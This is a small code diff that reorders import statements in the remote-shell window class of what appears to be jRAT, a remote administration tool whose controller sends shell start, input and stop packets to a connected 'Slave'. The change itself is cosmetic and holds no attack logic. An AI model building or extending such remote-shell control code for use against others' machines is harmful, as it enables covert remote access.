@@ -1,22 +1,19 @@
 package io.jrat.controller.ui.frames;
 
+import com.redpois0n.terminal.InputListener;
+import com.redpois0n.terminal.JTerminal;
 import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.Packet22RemoteShellTyped;
 import io.jrat.controller.packets.outgoing.Packet23RemoteShellStart;
 import io.jrat.controller.packets.outgoing.Packet24RemoteShellStop;
-
 import java.awt.BorderLayout;
 import java.awt.Toolkit;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
 import java.util.Map;
-
 import javax.swing.JFrame;
 import javax.swing.JScrollPane;
-
-import com.redpois0n.terminal.InputListener;
-import com.redpois0n.terminal.JTerminal;
 
 @SuppressWarnings("serial")
 public class FrameRemoteShell extends BaseFrame {
